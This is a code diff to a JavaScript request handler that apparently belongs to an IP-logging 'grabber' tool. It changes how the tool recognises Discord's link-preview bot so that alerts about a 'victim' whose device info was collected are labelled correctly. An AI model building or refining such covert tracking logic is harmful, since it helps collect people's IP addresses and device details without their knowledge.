@@ -83,11 +83,11 @@ export default async function handler(req, res) {
 
         let message;
 
-        if (ipDetails.hosting) {
+        if (ipDetails.isp === "Google LLC" && userAgent.includes("Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)")) {
             message = {
                 embeds: [
                     {
-                        title: "User Send Link To Victim",
+                        title: "User Send Link To Victim in Discord Message",
                         color: 0xFF0000, // Red color to indicate alert
                         description: "Device info collected from sender.",
                         fields: [
